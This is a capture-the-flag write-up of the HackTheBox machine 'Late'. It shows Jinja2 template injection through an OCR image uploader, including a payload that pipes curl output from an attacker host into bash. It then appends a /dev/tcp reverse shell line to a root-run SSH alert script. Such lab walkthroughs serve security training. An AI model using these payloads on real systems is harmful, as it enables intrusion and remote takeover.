## Late - HackTheBox
<img width="418" alt="image" src="https://user-images.githubusercontent.com/114961392/204166573-ab9908e9-5e8c-46fc-b8d7-5e250b4f25b1.png">


Machine: Late  
Operating System: Linux  
Release Date: 23/04/2022  
Difficulty: Easy  

Vulnerability: Server Side Template Injection (SSTI)  

### Reconnaissance

Let's start by scanning all ports with Nmap then scan open ports with service scan and script scan.  

<img width="479" alt="image" src="https://user-images.githubusercontent.com/114961392/204166679-c102834b-6f95-40cf-9b35-c7eba4862d19.png">

Only ports 22 (SSH) and 80 (HTTP) are open. Let's take a look at port 80.  

<img width="588" alt="image" src="https://user-images.githubusercontent.com/114961392/204166759-cb80ad12-7028-4dc3-be7c-a0941378ae08.png">

We are presented with a web page that looks like a photo editor. We can see down the bottom there is an email **support@late.htb** and a link which goes to **images.late.htb**.  
Let's add these 2 domains to our /etc/hosts file.  

Next let's take a look at the **images.late.htb** domain.  

<img width="645" alt="image" src="https://user-images.githubusercontent.com/114961392/204167003-e5e8db6a-63e5-491c-b4d0-784d4b8cef9c.png">

It's an application which converts an image to text. Let's test it out by creating a image file with **KolourPaint** and upload.  

<img width="542" alt="image" src="https://user-images.githubusercontent.com/114961392/204167409-7a0d571d-7963-485b-ba7b-c518e42b32e0.png">

After uploaded, we get a **results.txt** file with the text converted from the image presented in a HTML template:  

<img width="130" alt="image" src="https://user-images.githubusercontent.com/114961392/204167475-235d19b0-0aa3-4611-bcf1-010c6a7df399.png">

After doing some research, it looks like the application works by using an [Optical Character Recognition](https://en.wikipedia.org/wiki/Optical_character_recognition) program on the server side.  
First, the uploaded image is handled by flask, then passed to an OCR, then the output is passed through a HTML template and packaged as a text file.  
Due to this, it looks like there is a Server Side Template Injection (SSTI) vulnerability.  

A great resource for SSTI is [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). Let's have a look at how to exploit.  
First, I will look at the picture in the **Methodology** section to find which template engine it's using. The first payload did not work and returned the text back exactly as entered.  

<img width="126" alt="image" src="https://user-images.githubusercontent.com/114961392/204168808-c27f49f4-5822-4c93-8091-0ae18b150cf9.png">

### Exploitation

Following the methodology from PayloadsAllTheThings, I will try the next payload which works and returns the value 49 which is 7x7.  

<img width="125" alt="image" src="https://user-images.githubusercontent.com/114961392/204169190-da4717ee-6eb3-4753-92be-50c682021c10.png">

We will try the next payload **{{7*'7'}}** which works too so the server is most likely using the Jinja2 template engine. Now that we know the template engine, we can try some exploits.  

<img width="126" alt="image" src="https://user-images.githubusercontent.com/114961392/204170495-d6e50a85-1892-4077-b437-bd8a2aa3c08f.png">

Looking under the Jinja2 section in PayloadsAllTheThings, we will try payload **{{ cycler.__init__.__globals__.os.popen('id').read() }}**.  
Before we continue, it is worth noting that the fonts played a huge part in getting the OCR to understand the text. My first few attempts produced errors within the application as it could not read the text.  
I found that the font, **FreeMono** in KolourPaint, worked without any errors and produced the result: 

<img width="303" alt="image" src="https://user-images.githubusercontent.com/114961392/204171146-e17185ac-4454-4fa5-94af-7a55357cc53d.png">

Now let's craft a reverse shell payload, upload to the target through a python server and execute. I will create a file called x with the following reverse shell from revshells.com:

<img width="222" alt="image" src="https://user-images.githubusercontent.com/114961392/204171728-ddbdff76-1d4e-4ad3-a221-cf287e65b00e.png">

Then I will setup a python server in that directory so the target can connect and download the file. I will also set up a netcat listener to catch the returning connection.  
Let's craft the payload to **{{ cycler.__init__.__globals__.os.popen('curl http://10.10.14.18/x | bash').read() }}**, which uses curl to connect back to my machine, download the reverse shell, then my netcat listener should catch the connection.  

<img width="325" alt="image" src="https://user-images.githubusercontent.com/114961392/204172438-ce0365c4-5607-4d9e-a898-ddedc4891f33.png">

<img width="404" alt="image" src="https://user-images.githubusercontent.com/114961392/204172497-140e753e-2949-44bd-91fd-8b041026a998.png">

This works and now we have a reverse shell with user **svc_acc**! I will use the normal technique for upgrading the terminal:

<img width="401" alt="image" src="https://user-images.githubusercontent.com/114961392/204173049-d3ece769-7a35-4d95-9cac-542f547b5bdb.png">

From here we can capture user flag:  

<img width="218" alt="image" src="https://user-images.githubusercontent.com/114961392/204173145-e837fe51-4ea4-4c9d-9aab-7d4820bbf6b3.png">

### Privilege Escalation

There is also an **.ssh** folder with an **id_rsa** file so let's copy that and use it to SSH into the machine for a more stable connection. Remember to set permissions of **id_rsa** file to chmod 400.  

<img width="331" alt="image" src="https://user-images.githubusercontent.com/114961392/204173714-293232c4-9d62-4650-b8a0-9bacd0693f7d.png">

<img width="184" alt="image" src="https://user-images.githubusercontent.com/114961392/204173899-dd49caf5-701d-43c6-bddb-4b24ebb81056.png">

From here I will upload **linpeas** and execute to find privilege escalation paths. Linpeas shows an interesting file that we can write to, **/usr/local/sbin/ssh-alert.sh**.  

<img width="503" alt="image" src="https://user-images.githubusercontent.com/114961392/204174544-4dab6f6c-f217-40d2-a46a-6ec0f2c6c08c.png">

Let's have a look at the file:  

<img width="387" alt="image" src="https://user-images.githubusercontent.com/114961392/204174960-4320bb71-5653-4b72-be2b-3edad9bc8a31.png">

It is just a simple script that sends an email to root@late.htb every time someone logs into SSH. Checking the permissions for the file reveals:  

<img width="386" alt="image" src="https://user-images.githubusercontent.com/114961392/204175281-807699a3-7848-4ed7-9658-a5104c9c057a.png">

And checking the file attributes reveals that the file only allows appending, not writing.  

<img width="284" alt="image" src="https://user-images.githubusercontent.com/114961392/204175454-b35a6fc9-c5ef-49bb-8eb2-edbfa114c5a4.png">

So we can add something to the end of the file however we can not write over it completely.  
Now let's check with [PSPY](https://github.com/DominicBreuker/pspy) how the script is running. I will upload pspy to the target machine then log in and out of SSH to see what happens:  

<img width="454" alt="image" src="https://user-images.githubusercontent.com/114961392/204178079-6f312f8c-b95c-44d4-9704-f0ec0c9b07dd.png">

This shows that it is running the script everytime someone logs onto SSH.  
Now let's append the script file so it connects back to our listener.  
**echo "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1" >> /usr/local/sbin/ssh-alert.sh**  

<img width="491" alt="image" src="https://user-images.githubusercontent.com/114961392/204179064-58cf7f82-016d-4175-942e-76f6b22ce4b4.png">

Then set up another netcat listener and exit the SSH connection so it executes the appended script.  

<img width="408" alt="image" src="https://user-images.githubusercontent.com/114961392/204179277-5291e329-c341-48ec-8d52-55f2c81120df.png">

After exiting, the netcat listener has a root connection. From here we can go ahead and capture the root flag.  

